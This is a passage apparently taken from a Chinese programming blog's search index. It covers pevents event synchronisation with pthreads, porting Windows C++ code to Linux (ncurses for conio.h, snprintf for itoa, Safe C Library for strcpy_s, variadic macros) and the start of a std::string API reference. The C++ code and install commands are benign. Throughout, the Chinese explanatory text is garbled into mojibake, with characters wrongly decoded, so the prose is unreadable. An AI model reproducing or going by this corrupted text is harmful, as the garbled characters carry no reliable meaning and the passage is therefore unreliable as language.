æ‰‹åŠ¨æ¸…é™¤äº‹ä»¶ä¿¡å·ï¼Œåˆå§‹çŠ¶æ€ä¸ºæœ‰ä¿¡å· g_hEvent = CreateEvent(true, true); pthread_t ntid1; pthread_create(&amp;ntid1, NULL, procFunc1, NULL); sleep(1); pthread_t ntid2; pthread_create(&amp;ntid2, NULL, procFunc2, NULL); sleep(5);} ç¨‹åºè¿è¡Œçš„ç»“æœå¦‚ä¸‹ï¼š 1234thread-1 pid 62705 tid 2336241408 (0x8b403700)thread-1 is working...thread-2 pid 62705 tid 2327848704 (0x8ac02700)thread-2 is working... æç¤º å¯ä»¥çœ‹åˆ°çº¿ç¨‹ 1 å’Œçº¿ç¨‹ 2 éƒ½å®Œæ•´æ‰§è¡Œäº†ï¼Œè¿™æ˜¯å› ä¸ºåˆ›å»ºçš„äº‹ä»¶æ˜¯éœ€æ‰‹åŠ¨ Reset æ‰ä¼šå˜ä¸ºæ— ä¿¡å·çš„ï¼Œæ‰€ä»¥æ‰§è¡Œå®Œçº¿ç¨‹ 1 åäº‹ä»¶ä»å¤„äºæœ‰ä¿¡å·çš„çŠ¶æ€ï¼Œæ‰€ä»¥çº¿ç¨‹ 2 çš„é€»è¾‘æ‰ä¼šè¢«ç»§ç»­æ‰§è¡Œã€‚ å®æˆ˜æ¡ˆä¾‹äºŒCreateEvent(false, true) - è‡ªåŠ¨æ¸…é™¤äº‹ä»¶ä¿¡å·ï¼Œä¸”åˆå§‹çŠ¶æ€ä¸ºæœ‰ä¿¡å·ï¼Œç‚¹å‡»ä¸‹è½½ åŸºäº CMake æ„å»ºçš„å®Œæ•´æ¡ˆä¾‹ä»£ç  12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include &lt;iostream&gt;#include &lt;unistd.h&gt;#include &lt;pthread.h&gt;#include "pevents.h"using namespace std;using namespace neosmart;neosmart_event_t g_hEvent = NULL;void printIds(const char *s) { pid_t pid = getpid(); pthread_t tid = pthread_self(); printf("%s pid %u tid %u (0x%x)\\n", s, (unsigned int) pid, (unsigned int) tid, (unsigned int) tid);}void *procFunc1(void *args) { printIds("thread-1"); if (WaitForEvent(g_hEvent, 1) == 0) { cout &lt;&lt; "thread-1 is working..." &lt;&lt; endl; } return ((void *) 0);}void *procFunc2(void *args) { printIds("thread-2"); if (WaitForEvent(g_hEvent, 1) == 0) { cout &lt;&lt; "thread-2 is working..." &lt;&lt; endl; } return ((void *) 0);}int main() { // è‡ªåŠ¨æ¸…é™¤äº‹ä»¶ä¿¡å·ï¼Œåˆå§‹çŠ¶æ€ä¸ºæœ‰ä¿¡å· g_hEvent = CreateEvent(false, true); pthread_t ntid1; pthread_create(&amp;ntid1, NULL, procFunc1, NULL); sleep(1); pthread_t ntid2; pthread_create(&amp;ntid2, NULL, procFunc2, NULL); sleep(5);} ç¨‹åºè¿è¡Œçš„ç»“æœå¦‚ä¸‹ï¼š 123thread-1 pid 59685 tid 2245932800 (0x85de3700)thread-1 is working...thread-2 pid 59685 tid 2237540096 (0x855e2700) æç¤º å¯ä»¥çœ‹åˆ°åªæœ‰çº¿ç¨‹ 1 å®Œæ•´æ‰§è¡Œäº†ï¼Œè¿™æ˜¯ç”±äºäº‹ä»¶åœ¨æ‰§è¡Œå®Œçº¿ç¨‹ 1 åè¢«ç³»ç»Ÿè‡ªåŠ¨é‡ç½®ä¸ºæ— ä¿¡å·ï¼Œæ‰€ä»¥çº¿ç¨‹ 2 ä¸­çš„é€»è¾‘æ²¡æœ‰è¢«æ‰§è¡Œã€‚ å®æˆ˜æ¡ˆä¾‹ä¸‰CreateEvent(true, false) - æ‰‹åŠ¨æ¸…é™¤äº‹ä»¶ä¿¡å·ï¼Œåˆå§‹çŠ¶æ€ä¸ºæ— ä¿¡å·ï¼ŒåŒ…æ‹¬ SetEventï¼ˆï¼‰ ä¸ ResetEvent() çš„ä½¿ç”¨ï¼Œç‚¹å‡»ä¸‹è½½ åŸºäº CMake æ„å»ºçš„å®Œæ•´æ¡ˆä¾‹ä»£ç  1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#include &lt;iostream&gt;#include &lt;unistd.h&gt;#include &lt;pthread.h&gt;#include "pevents.h"using namespace std;using namespace neosmart;neosmart_event_t g_hEvent = NULL;void printIds(const char *s) { pid_t pid = getpid(); pthread_t tid = pthread_self(); printf("%s pid %u tid %u (0x%x)\\n", s, (unsigned int) pid, (unsigned int) tid, (unsigned int) tid);}void *procFunc1(void *args) { printIds("thread-1"); if (WaitForEvent(g_hEvent, 1) == 0) { cout &lt;&lt; "thread-1 is working..." &lt;&lt; endl; } // é‡ç½®äº‹ä»¶ä¸ºæ— ä¿¡å· ResetEvent(g_hEvent); return ((void *) 0);}void *procFunc2(void *args) { printIds("thread-2"); if (WaitForEvent(g_hEvent, 1) == 0) { cout &lt;&lt; "thread-2 is working..." &lt;&lt; endl; } return ((void *) 0);}void func1() { // æ‰‹åŠ¨æ¸…é™¤äº‹ä»¶ä¿¡å·ï¼Œåˆå§‹çŠ¶æ€ä¸ºæœ‰ä¿¡å· g_hEvent = CreateEvent(true, true); pthread_t ntid1; pthread_create(&amp;ntid1, NULL, procFunc1, NULL); sleep(1); pthread_t ntid2; pthread_create(&amp;ntid2, NULL, procFunc2, NULL); sleep(5);}int main() { // æ‰‹åŠ¨æ¸…é™¤äº‹ä»¶ä¿¡å·ï¼Œåˆå§‹çŠ¶æ€ä¸ºæ— ä¿¡å· g_hEvent = CreateEvent(true, false); // è®¾ç½®äº‹ä»¶ä¸ºæœ‰ä¿¡å· SetEvent(g_hEvent); pthread_t ntid1; pthread_create(&amp;ntid1, NULL, procFunc1, NULL); sleep(1); pthread_t ntid2; pthread_create(&amp;ntid2, NULL, procFunc2, NULL); sleep(5); return 0;} ç¨‹åºè¿è¡Œçš„ç»“æœå¦‚ä¸‹ï¼š 123thread-1 pid 70368 tid 2745513728 (0xa3a53700)thread-1 is working...thread-2 pid 70368 tid 2737121024 (0xa3252700) æç¤º å¯ä»¥çœ‹åˆ°åªæœ‰çº¿ç¨‹ 1 å®Œæ•´æ‰§è¡Œäº†ï¼Œè¿™æ˜¯å› ä¸ºçº¿ç¨‹ 1 åœ¨æ‰§è¡Œä¹‹å‰äº‹ä»¶æ˜¯æœ‰ä¿¡å·çš„ï¼Œæ‰§è¡Œå®Œæˆåäº‹ä»¶è¢«æ‰‹åŠ¨é‡ç½®ä¸ºæ— ä¿¡å·ï¼Œæ‰€ä»¥çº¿ç¨‹ 2 ä¸­çš„é€»è¾‘æ²¡æœ‰è¢«æ‰§è¡Œã€‚ å‚è€ƒèµ„æ–™ C++ çš„ CreateEvent () WaitForSingleObject å’Œ WaitForMultipleObject äº‹ä»¶ SetEventã€ResetEventã€WaitForSingleObject ä¸ CreateEvent è¯¦è§£ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"c++ linuxç³»ç»Ÿç¼–ç¨‹"},{title:"Linux ç§»æ¤ Windows çš„ C++ ä»£ç ",url:"/posts/15f45d12.html",text:'conio.h å¤´æ–‡ä»¶ç§»æ¤ç®€è¿°conio.h ä¸æ˜¯ C æ ‡å‡†åº“ä¸­çš„å¤´æ–‡ä»¶ï¼Œåœ¨ ISO å’Œ POSIX æ ‡å‡†ä¸­å‡æ²¡æœ‰å®šä¹‰ã€‚conio æ˜¯ Console Input/Outputï¼ˆæ§åˆ¶å°è¾“å…¥è¾“å‡ºï¼‰çš„ç®€å†™ï¼Œå…¶ä¸­å®šä¹‰äº†é€šè¿‡æ§åˆ¶å°è¿›è¡Œæ•°æ®è¾“å…¥å’Œæ•°æ®è¾“å‡ºçš„å‡½æ•°ï¼Œä¸»è¦æ˜¯ä¸€äº›ç”¨æˆ·é€šè¿‡æŒ‰é”®ç›˜äº§ç”Ÿçš„å¯¹åº”æ“ä½œï¼Œæ¯”å¦‚ getch() å‡½æ•°ç­‰ç­‰ã€‚å¤§éƒ¨åˆ† DOSã€Windowsã€Phar Lapã€DOSXï¼ŒOS/2 ç­‰å¹³å°ä¸Šçš„ C ç¼–è¯‘å™¨æä¾›äº†æ­¤å¤´æ–‡ä»¶ï¼ŒUNIX å’Œ Linux å¹³å°çš„ C ç¼–è¯‘å™¨æœ¬èº«é€šå¸¸ä¸åŒ…å«æ­¤å¤´æ–‡ä»¶ã€‚å¦å¤–åœ¨é¡¹ç›®å¼€å‘ä¸­ï¼Œå¹³æ—¶ä¸»è¦æ˜¯ä½¿ç”¨ conio.h è¿™ä¸ªå¤´æ–‡ä»¶ä¸­çš„ getch() å‡½æ•°ï¼Œå³è¯»å–é”®ç›˜å­—ç¬¦ä½†æ˜¯ä¸æ˜¾ç¤ºå‡ºæ¥ï¼ˆwithout echo)ï¼Œä½†æ˜¯å«æœ‰ conio.h çš„ä»£ç åœ¨ Linux ä¸‹æ— æ³•ç›´æ¥ç¼–è¯‘é€šè¿‡ï¼Œå› ä¸º Linux æ²¡æœ‰è¿™ä¸ªå¤´æ–‡ä»¶ã€‚ä½† Linux å¹³å°ä¸‹å®Œå…¨å¯ä»¥ä½¿ç”¨ ncurses æ›¿ä»£ conio.h å¤´æ–‡ä»¶ï¼Œncurses æ”¯æŒçš„ API å¯ä»¥é˜…è¯» å®˜æ–¹æ–‡æ¡£ã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼Œncurses åœ¨ Linux å¹³å°å®ç°äº† getch()ã€scanw()ã€getstr() ç­‰å‡½æ•°ã€‚ å®‰è£…ä¾èµ–æç¤º ç”±äº ncurses ä¸æ˜¯ Linux ç³»ç»Ÿé»˜è®¤çš„åº“ï¼Œå› æ­¤éœ€è¦å®‰è£…åæ‰èƒ½ä½¿ç”¨ï¼Œä¸åŒå¹³å°çš„å®‰è£…å‘½ä»¤å¦‚ä¸‹ï¼š CentOS/Fedora 1# yum install -y ncurses ncurses-devel Debian/Ubuntu 1# apt-get install -y libncurses5-dev libncursesw5-dev æ¡ˆä¾‹ä»£ç æç¤º ncurses.h ä¸ curses.h è¿™ä¸¤ä¸ªå¤´æ–‡ä»¶æ˜¯ç­‰ä»·çš„ 12345678910#include &lt;iostream&gt;#include &lt;ncurses.h&gt;using namespace std;int main() { cout &lt;&lt; ("Hello Wolrd!") &lt;&lt; endl; getch(); return 0;} ç¼–è¯‘è¯´æ˜ç”±äº ncurses ä¸æ˜¯ Linux ç³»ç»Ÿé»˜è®¤çš„åº“ï¼Œå› æ­¤ç¼–è¯‘æ—¶éœ€è¦é“¾æ¥åˆ°è¯¥åº“ï¼ŒåŒæ—¶è¿˜éœ€è¦åœ¨ C++ çš„æºæ–‡ä»¶é‡Œæ·»åŠ å¤´æ–‡ä»¶ ncurses.hï¼Œå¦åˆ™ç¼–è¯‘ä¼šå¤±è´¥ã€‚ æç¤º ä¸ºäº†å¯ä»¥æ­£å¸¸ç¼–è¯‘ä½¿ç”¨äº† ncurses çš„é¡¹ç›®ä»£ç ï¼Œä¸åŒæ„å»ºå·¥å…·çš„ä½¿ç”¨è¯´æ˜å¦‚ä¸‹ï¼š è‹¥ä½¿ç”¨ G++ ç¼–è¯‘ C++ é¡¹ç›®ï¼Œåˆ™ç¼–è¯‘å‘½ä»¤çš„ç¤ºä¾‹å¦‚ä¸‹ï¼š 12# ç¼–è¯‘ä»£ç $ g++ main.cpp -o main -lncurses è‹¥ä½¿ç”¨ CMake æ„å»º C++ é¡¹ç›®ï¼Œåˆ™ CMakeLists.txt é…ç½®æ–‡ä»¶çš„ç¤ºä¾‹å†…å®¹å¦‚ä¸‹ï¼š 123set(CMAKE_CXX_FLAGS "-std=c++11 -lncurses")add_executable(main main.cpp) itoa () å‡½æ•°ç§»æ¤ç®€è¿°åœ¨ Window å¹³å°é‡Œï¼Œitoa() å‡½æ•°å¯ä»¥å°†æ•´æ•°è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œå…¶å‡½æ•°çš„åŸå‹å¦‚ä¸‹ã€‚Linux å¹³å°ä¸­åªæœ‰ atoi() å‡½æ•°ï¼Œå¹¶æ²¡æœ‰å¯¹åº”çš„ itoa() å‡½æ•°ï¼Œä½†å¯ä»¥ä½¿ç”¨ sprintf() æˆ–è€… snprintf() å‡½æ•°æ›¿ä»£ï¼Œå»ºè®®ä½¿ç”¨æ›´å®‰å…¨çš„ snprintf()ã€‚ itoa () å‡½æ•° å‡½æ•°åŸå‹ï¼šchar *itoa( int value, char *string,int radix) å‡½æ•°åŠŸèƒ½ï¼šå°†æ•´æ•° value è½¬æ¢æˆå­—ç¬¦ä¸²å­˜å…¥ string æŒ‡å‘çš„å†…å­˜ç©ºé—´ï¼Œradix ä¸ºè½¬æ¢æ—¶æ‰€ç”¨åŸºæ•° (ä¿å­˜åˆ°å­—ç¬¦ä¸²ä¸­çš„æ•°æ®çš„è¿›åˆ¶åŸºæ•°) å‡½æ•°çš„å‚æ•°ï¼švalueï¼šè½¬æ¢çš„æ•°æ®ï¼Œstringï¼šç›®æ ‡å­—ç¬¦ä¸²çš„åœ°å€ï¼Œradixï¼šè½¬æ¢åçš„è¿›åˆ¶æ•°ï¼Œå¯ä»¥æ˜¯ 10 è¿›åˆ¶ã€16 è¿›åˆ¶ç­‰ï¼ŒèŒƒå›´å¿…é¡»åœ¨ 2-36 ä¹‹é—´ snprintf () å‡½æ•° å¤´æ–‡ä»¶ï¼š#include &lt;stdio.h&gt; å‡½æ•°åŸå‹ï¼šint snprintf(char *str, size_t size, const char *format, ...) å‡½æ•°åŠŸèƒ½ï¼šå°†å¯å˜å‚æ•° ... æŒ‰ç…§ format æ ¼å¼åŒ–æˆå­—ç¬¦ä¸²ï¼Œç„¶åå°†å…¶å¤åˆ¶åˆ° str ä¸­ å‡½æ•°å‚æ•°ï¼šstrï¼šç›®æ ‡å­—ç¬¦ä¸²ï¼Œsizeï¼šæ‹·è´å­—èŠ‚æ•°ï¼ˆBytesï¼‰ï¼Œformatï¼šæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œ... å¯å˜å‚æ•° æ¡ˆä¾‹ä»£ç 1234567891011#include &lt;iostream&gt;using namespace std;int main() { int num = 12; char str[4]; int size = snprintf(str, 4, "%d", num); cout &lt;&lt; "str = " &lt;&lt; str &lt;&lt; ", size = " &lt;&lt; size &lt;&lt; endl; return 0;} ç¨‹åºè¿è¡Œçš„è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š 1str = 12, size = 2 strcpy_s () å‡½æ•°ç›¸å…³ç«™ç‚¹ Safe C Library çš„ä¸‹è½½é¡µé¢ Safe C Library çš„å®˜æ–¹æ–‡æ¡£ Safe C Library çš„ GitHub é¡¹ç›® ç§»æ¤ç®€è¿°åœ¨ Window å¹³å°ä¸Šï¼Œstrcpy_s() å‡½æ•°å­˜åœ¨äº #include &lt;cstring&gt; å¤´æ–‡ä»¶ä¸­ã€‚Linux å¹³å°æ²¡æœ‰è¯¥å‡½æ•°ï¼Œä½†å¯ä»¥ä½¿ç”¨ Safe C Library æ›¿ä»£å®ç°ã€‚Safe C Library è¿™ä¸ªåº“æ˜¯åœ¨ libc çš„åŸºç¡€ä¹‹ä¸Šå®ç°äº†å®‰å…¨çš„ C11 Annex K å‡½æ•°ï¼Œè¿™äº›å‡½æ•°æ˜¯å®ƒä»¬æ‰€ç¼ºå°‘çš„ï¼Œå¯ä»¥å¸®åŠ©ç¼“è§£ä¸æ–­å¢åŠ çš„å®‰å…¨æ”»å‡»ï¼Œç‰¹åˆ«æ˜¯ç¼“å†²åŒºæº¢å‡ºã€‚ å®‰è£…ä¾èµ–æç¤º ç”±äº Safe C Library ä¸æ˜¯ Linux ç³»ç»Ÿé»˜è®¤çš„åº“ï¼Œå› æ­¤éœ€è¦å®‰è£…åæ‰èƒ½ä½¿ç”¨ï¼Œå…¶é»˜è®¤çš„å®‰è£…ç›®å½•å¦‚ä¸‹ /usr/local/lib/ï¼šåŒ…å«é™æ€åº“å’ŒåŠ¨æ€é“¾æ¥åº“æ–‡ä»¶ /usr/local/include/libsafecï¼šåŒ…æ‰€æœ‰å«å¤´æ–‡ä»¶ 1234567891011121314151617# ä¸‹è½½æ–‡ä»¶ï¼ˆè¿™é‡Œä¸‹è½½çš„ä¸æ˜¯æºç å‹ç¼©åŒ…ï¼‰# wget https://github.com/rurban/safeclib/releases/download/v02092020/libsafec-02092020.tar.gz# è§£å‹æ–‡ä»¶# tar -xvf libsafec-02092020.tar.gz# è¿›å…¥è§£å‹ç›®å½•# cd libsafec-02092020.0-g6d921f# é…ç½®# ./configure# ç¼–è¯‘# make -j4# å®‰è£…# make install å€¼å¾—ä¸€æçš„æ˜¯ï¼ŒSafe C Library ç¼–è¯‘åä¼šå•ç‹¬ç”Ÿæˆé™æ€åº“æ–‡ä»¶ /usr/local/lib/libsafec-3.6.0.a å’ŒåŠ¨æ€é“¾æ¥åº“æ–‡ä»¶ /usr/local/lib/libsafec-3.6.0.so.3.0.6ï¼Œå…¶ä¸­çš„ 3.6.0 æ˜¯æŒ‡ç‰ˆæœ¬å·ã€‚ æ¡ˆä¾‹ä»£ç æç¤º strcpy_s() å‡½æ•°åœ¨ Safe C Library é‡Œçš„ safe_str_lib.h å¤´æ–‡ä»¶ä¸­å£°æ˜ 123456789101112#include &lt;iostream&gt;#include &lt;libsafec/safe_str_lib.h&gt;using namespace std;int main() { char *str = new char[5]; strcpy_s(str, 5, "abcd"); cout &lt;&lt; str &lt;&lt; endl; delete[] str; return 0;} ç¼–è¯‘è¯´æ˜ç”±äº Safe C Library ä¸æ˜¯ Linux ç³»ç»Ÿé»˜è®¤çš„åº“ï¼Œå› æ­¤ç¼–è¯‘æ—¶éœ€è¦é“¾æ¥åˆ°è¯¥åº“ï¼ŒåŒæ—¶è¿˜éœ€è¦åœ¨ C++ çš„æºæ–‡ä»¶é‡Œæ·»åŠ å¤´æ–‡ä»¶ &lt;libsafec/safe_str_lib.h&gt;ï¼Œå¦åˆ™ç¼–è¯‘ä¼šå¤±è´¥ã€‚ æç¤º ä¸ºäº†å¯ä»¥æ­£å¸¸ç¼–è¯‘ä½¿ç”¨äº† Safe C Library çš„é¡¹ç›®ä»£ç ï¼Œä¸åŒæ„å»ºå·¥å…·çš„ä½¿ç”¨è¯´æ˜å¦‚ä¸‹æ‰€ç¤º å¯ä»¥å°†ä¸Šé¢æ„å»ºç”Ÿæˆçš„ libsafec-3.6.0.a é™æ€åº“æ–‡ä»¶å’Œ .h å¤´æ–‡ä»¶éƒ½æ‹·è´åˆ°é¡¹ç›®é‡Œï¼Œè¿™æ ·å°±å¯ä»¥æ–¹ä¾¿åœ¨ä¸åŒçš„ Linux ç³»ç»Ÿç¼–è¯‘å’Œè¿è¡Œé¡¹ç›®ï¼Œä¸ç”¨æ¯æ¬¡åˆ‡æ¢ç³»ç»Ÿæ—¶éƒ½è¦é‡æ–°å®‰è£… Safe C Library è‹¥ä½¿ç”¨ G++ ç¼–è¯‘ C++ é¡¹ç›®ï¼Œåˆ™ç¼–è¯‘å‘½ä»¤çš„ç¤ºä¾‹å¦‚ä¸‹ï¼Œè¯·è‡ªè¡Œæ›´æ”¹åº“æ–‡ä»¶çš„ç‰ˆæœ¬å·ï¼š 12345# ç¼–è¯‘ä»£ç $ g++ main.cpp -o main -L/usr/local/lib/ -l:libsafec-3.6.0.a# "-L" å‚æ•°æŒ‡å®šäº†åº“æ–‡ä»¶çš„ç›®å½•è·¯å¾„# "-l:" å‚æ•°æŒ‡å®šäº†åº“æ–‡ä»¶çš„æ–‡ä»¶å è‹¥ä½¿ç”¨ CMake æ„å»º C++ é¡¹ç›®ï¼Œåˆ™ CMakeLists.txt é…ç½®æ–‡ä»¶çš„ç¤ºä¾‹å†…å®¹å¦‚ä¸‹ï¼Œè¯·è‡ªè¡Œæ›´æ”¹åº“æ–‡ä»¶çš„ç‰ˆæœ¬å·ï¼š 123link_libraries(/usr/local/lib/libsafec-3.6.0.a)add_executable(windows_to_linux main.cpp) å‡½æ•°å¯å˜å‚æ•°å®ç§»æ¤ç®€è¿°åœ¨ Windows å¹³å°ä¸ Linux å¹³å°ï¼Œå‡½æ•°å¯å˜å‚æ•°å®å®šä¹‰çš„è¯­æ³•æ˜¯ä¸ä¸€æ ·çš„ã€‚ æ¡ˆä¾‹ä»£ç  Windows å¹³å°çš„å‡½æ•°å¯å˜å‚æ•°å®å®šä¹‰çš„å†™æ³•å¦‚ä¸‹ï¼Œä½¿ç”¨çš„æ˜¯ __VA_ARGS__ 12FILE* logfile = fopen("syslog.txt", "w");#define LOG(format, ...) fprintf(logfile, format, __VA_ARGS__); printf(format, __VA_ARGS__); fflush(logfile); Linux å¹³å°çš„å‡½æ•°å¯å˜å‚æ•°å®å®šä¹‰å†™æ³•å¦‚ä¸‹ï¼Œä½¿ç”¨çš„æ˜¯ ##__VA_ARGS__ 12FILE* logfile = fopen("syslog.txt", "w");#define LOG(format, ...) fprintf(logfile, format, ##__VA_ARGS__); printf(format, ##__VA_ARGS__); fflush(logfile); var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"c++ linuxç³»ç»Ÿç¼–ç¨‹"},{title:"C++ è¿›é˜¶åŸºç¡€ä¹‹å…­",url:"/posts/62e4578b.html",text:'string å®¹å™¨string å®¹å™¨çš„æ¦‚å¿µstring æ˜¯ STL çš„å­—ç¬¦ä¸²ç±»å‹ï¼Œé€šå¸¸ç”¨æ¥è¡¨ç¤ºå­—ç¬¦ä¸²ã€‚è€Œåœ¨ä½¿ç”¨ string ä¹‹å‰ï¼Œå­—ç¬¦ä¸²é€šå¸¸æ˜¯ç”¨ char* è¡¨ç¤ºçš„ã€‚string ä¸ char* éƒ½å¯ä»¥ç”¨æ¥è¡¨ç¤ºå­—ç¬¦ä¸²ï¼Œä¸¤è€…çš„åŒºåˆ«å¦‚ä¸‹ï¼š string æ˜¯ä¸€ä¸ªç±»ï¼Œchar* æ˜¯ä¸€ä¸ªæŒ‡å‘å­—ç¬¦çš„æŒ‡é’ˆ string å°è£…äº† char* æ¥ç®¡ç†å­—ç¬¦ä¸²ï¼Œæœ¬è´¨æ˜¯ä¸€ä¸ª char* ç±»å‹çš„å®¹å™¨ string ä¸ç”¨è€ƒè™‘å†…å­˜é‡Šæ”¾å’Œè¶Šç•Œçš„é—®é¢˜ string è´Ÿè´£ç®¡ç† char* æ‰€åˆ†é…çš„å†…å­˜ã€‚æ¯ä¸€æ¬¡ string çš„å¤åˆ¶ï¼Œå–å€¼éƒ½ç”± string ç±»è´Ÿè´£ç»´æŠ¤ï¼Œä¸ç”¨æ‹…å¿ƒå¤åˆ¶è¶Šç•Œå’Œå–å€¼è¶Šç•Œç­‰é—®é¢˜ string æä¾›äº†ä¸€ç³»åˆ—çš„å­—ç¬¦ä¸²æ“ä½œå‡½æ•°ï¼Œä¾‹å¦‚ï¼šæŸ¥æ‰¾ï¼ˆfindï¼‰ã€æ‹·è´ï¼ˆcopyï¼‰ã€åˆ é™¤ï¼ˆeraseï¼‰ã€æ›¿æ¢ï¼ˆreplaceï¼‰ã€æ’å…¥ï¼ˆinsertï¼‰ stirng å®¹å™¨çš„ APIæ„é€ å‡½æ•° é»˜è®¤æ„é€ å‡½æ•°ï¼šstring(); å¸¦å‚æ•°çš„æ„é€ å‡½æ•°ï¼š string(const char *s);ï¼Œç”¨å­—ç¬¦ä¸² s åˆå§‹åŒ– string(int n, char c);ï¼Œç”¨ n ä¸ªå­—ç¬¦ c åˆå§‹åŒ– æ‹·è´æ„é€ å‡½æ•°ï¼šstring(const string &amp;str); string çš„é•¿åº¦ size_t size() constï¼Œè¿”å›å½“å‰å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œè¿™é‡Œçš„é•¿åº¦ä¸åŒ…æ‹¬å­—ç¬¦ä¸²çš„ç»“å°¾çš„ \\0 å­—ç¬¦ size_t length() const;ï¼Œè¿”å›å½“å‰å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œè¿™é‡Œçš„é•¿åº¦ä¸åŒ…æ‹¬å­—ç¬¦ä¸²çš„ç»“å°¾çš„ \\0 å­—ç¬¦ bool empty() const;ï¼Œåˆ¤æ–­å½“å‰å­—ç¬¦ä¸²æ˜¯å¦ä¸ºç©º å€¼å¾—ä¸€æçš„æ˜¯ï¼Œsizeof() è¿”å›çš„æ˜¯å¯¹è±¡æ‰€å ç”¨ç©ºé—´çš„å­—èŠ‚æ•°ï¼Œstrlen() è¿”å›çš„æ˜¯å­—ç¬¦æ•°ç»„ä¸­ç¬¬ä¸€ä¸ª \\0 å‰çš„å­—èŠ‚æ•°ï¼Œstring çš„æˆå‘˜å‡½æ•° size() å’Œ length() æ²¡æœ‰ä»»ä½•åŒºåˆ«ã€‚ string çš„èµ‹å€¼ string &amp;operator=(const string &amp;s);ï¼ŒæŠŠå­—ç¬¦ä¸² s èµ‹ç»™å½“å‰çš„å­—ç¬¦ä¸² string &amp;assign(const char *s);ï¼ŒæŠŠå­—ç¬¦ä¸² s èµ‹ç»™å½“å‰çš„å­—ç¬¦ä¸² string &amp;assign(const char *s, int n);ï¼ŒæŠŠå­—ç¬¦ä¸² s çš„å‰ n ä¸ªå­—ç¬¦èµ‹ç»™å½“å‰çš„å­—ç¬¦ä¸² string &amp;assign(const string &amp;s);ï¼ŒæŠŠå­—ç¬¦ä¸² s èµ‹ç»™å½“å‰å­—ç¬¦ä¸² string &amp;assign(int n, char c);ï¼Œç”¨ n ä¸ªå­—ç¬¦ c èµ‹å€¼ç»™å½“å‰å­—ç¬¦ä¸² string &amp;assign(const string &amp;s, int start, int n);ï¼ŒæŠŠå­—ç¬¦ä¸² s ä¸­ä» start å¼€å§‹çš„ n ä¸ªå­—ç¬¦èµ‹å€¼ç»™å½“å‰å­—ç¬¦ä¸² string çš„å­ä¸² string substr(int pos=0, int n=npos) const;ï¼Œè¿”å›ç”± pos ä½ç½®å¼€å§‹çš„ n ä¸ªå­—ç¬¦ç»„æˆçš„å­å­—ç¬¦ä¸² string çš„æŸ¥æ‰¾ int find(char c, int pos=0) const;ï¼Œä» pos ä½ç½®å¼€å§‹æŸ¥æ‰¾å­—ç¬¦ c åœ¨å½“å‰å­—ç¬¦ä¸²ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½® int find(const char *s, int pos=0) const;ï¼Œä» pos ä½ç½®å¼€å§‹æŸ¥æ‰¾å­—ç¬¦ä¸² s åœ¨å½“å‰å­—ç¬¦ä¸²ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½® int find(const string &amp;s, int pos=0) const;ï¼Œä» pos ä½ç½®å¼€å§‹æŸ¥æ‰¾å­—ç¬¦ä¸² s åœ¨å½“å‰å­—ç¬¦ä¸²ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½® int rfind(char c, int pos=npos) const;ï¼Œä» pos ä½ç½®å¼€å§‹æŸ¥æ‰¾å­—ç¬¦ c åœ¨å½“å‰å­—ç¬¦ä¸²ä¸­æœ€åä¸€æ¬¡å‡ºç°çš„ä½ç½® int rfind(const char *s, int pos=npos) const;ï¼Œä» pos ä½ç½®å¼€å§‹æŸ¥æ‰¾å­—ç¬¦ä¸² s åœ¨å½“å‰å­—ç¬¦ä¸²ä¸­æœ€åä¸€æ¬¡å‡ºç°çš„ä½ç½® int rfind(const string &amp;s, int pos=npos) const;ï¼Œä» pos ä½ç½®å¼€å§‹æŸ¥æ‰¾å­—ç¬¦ä¸² s åœ¨å½“å‰å­—ç¬¦ä¸²ä¸­æœ€åä¸€æ¬¡å‡ºç°çš„ä½ç½® å€¼å¾—ä¸€æçš„æ˜¯ï¼Œå½“ find() ä¸ rfind() å‡½æ•°æŸ¥æ‰¾ä¸åˆ°æ—¶ï¼Œéƒ½ä¼šè¿”å› -1ï¼›ä¸¤è€…ä¸åŒçš„æ˜¯ find() æ˜¯æ­£å‘æŸ¥æ‰¾ï¼Œè€Œ rfind() æ˜¯é€†å‘æŸ¥æ‰¾ï¼Œä½†æ˜¯æœ€ç»ˆä¸¤ä¸ªå‡½æ•°è¿”å›çš„ä½ç½®å‡æ˜¯å­—ç¬¦ / å­—ç¬¦ä¸²å‡ºç°çš„æ­£å‘ä½ç½®ï¼›è‹¥æœ‰é‡å¤å­—ç¬¦ / å­—ç¬¦ä¸²æ—¶ï¼Œåˆ™ rfind() è¿”å›çš„æ˜¯é€†å‘æŸ¥æ‰¾åˆ°çš„å­—ç¬¦ / 